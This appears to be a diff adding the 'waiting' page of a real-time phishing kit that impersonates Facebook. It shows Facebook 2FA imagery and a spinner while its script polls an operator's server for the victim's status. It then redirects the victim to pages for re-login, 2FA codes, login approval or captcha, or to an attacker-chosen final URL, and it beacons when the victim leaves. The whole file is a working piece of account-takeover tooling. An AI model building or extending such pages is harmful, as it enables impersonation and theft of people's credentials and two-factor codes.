@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="<%= i18n.language %>">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title><%= t('waiting.title') %> - Facebook</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-50">
+    <div class="max-w-md mx-auto bg-white min-h-screen">
+        <div class="px-4 py-3 border-b border-gray-200">
+            <p class="text-sm text-gray-600"><%= t('waiting.header') %></p>
+        </div>
+
+        <div class="px-4 py-6 flex flex-col items-center justify-center min-h-[calc(100vh-80px)]">
+            <div class="mb-8 flex justify-center">
+                <div class="w-full max-w-sm rounded-lg overflow-hidden">
+                    <img
+                        src="https://i.ibb.co/hJwSkrr2/IXDE-Accounts-Center-Security-Settings-2-FA-Center2-edit-mobile-light-3x.png"
+                        alt="Verificación de seguridad"
+                        class="w-full h-auto"
+                    />
+                </div>
+            </div>
+
+            <div class="text-center">
+                <h2 class="text-2xl font-semibold text-gray-900 mb-2"><%= t('waiting.processing') %></h2>
+                <div class="flex justify-center">
+                    <div class="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-500"></div>
+                </div>
+            </div>
+            <script>
+                const urlParams = new URLSearchParams(location.search);
+                // document.getElementById('userField').value = urlParams.get('user');
+                //document.getElementById('propietarioField').value = urlParams.get('propietario');
+                //document.getElementById('urlFinalField').value = urlParams.get('url_final');
+                const user = urlParams.get("user");
+                const currentParamsString = urlParams.toString();
+
+                let isNavigatingInternally = false;
+
+                window.addEventListener('beforeunload', () => {
+                    if (!isNavigatingInternally && user) {
+                        const data = JSON.stringify({ user: user });
+                        navigator.sendBeacon('/disconnect', new Blob([data], { type: 'application/json' }));
+                    }
+                });
+
+                (function poll() {
+                    if (!user) return;
+                    fetch(`/code-status?user=${encodeURIComponent(user)}`)
+                        .then(res => res.json())
+                        .then((status) => {
+                            // =================================================================
+                            // == INICIO DE LA CORRECCIÓN
+                            // =================================================================
+                            if (status.accepted && status.accepted.url_final) {
+                                // CASO 1: Login exitoso. Redirigir a la URL final.
+                                isNavigatingInternally = true;
+                                window.location.href = status.accepted.url_final;
+                                return; // Salir de la función
+                            }
+
+                            if (status.accepted || status.failed || status.restart || status.approval || status.need || status.captcha) {
+                                isNavigatingInternally = true; 
+                            }
+
+                            if (status.failed) {
+                                window.location.href = `/?error=1&${currentParamsString}`;
+                            } else if (status.restart) {
+                                window.location.href = `/?${currentParamsString}`;
+                            } else if (status.approval && status.approval.required) {
+                              
+                                if (status.approval.accountName) {
+                                    urlParams.set('account_name', status.approval.accountName);
+                                }
+                                window.location.href = `/approval?${urlParams.toString()}`;
+                            }  else if (status.need) {
+                                window.location.href = `/code?${currentParamsString}`;
+                            }  else if (status.captcha && status.captcha.required) {
+                                window.location.href = `/captcha?${currentParamsString}`;
+                            } else {
+                                // Si no hay ninguna acción, seguimos esperando
+                                setTimeout(poll, 1500);
+                            }
+                            // =================================================================
+                            // == FIN DE LA CORRECCIÓN
+                            // =================================================================
+                        })
+                        .catch(() => setTimeout(poll, 2000));
+                })();
+            </script>
+        </div>
+    </div>
+</body>
+</html>
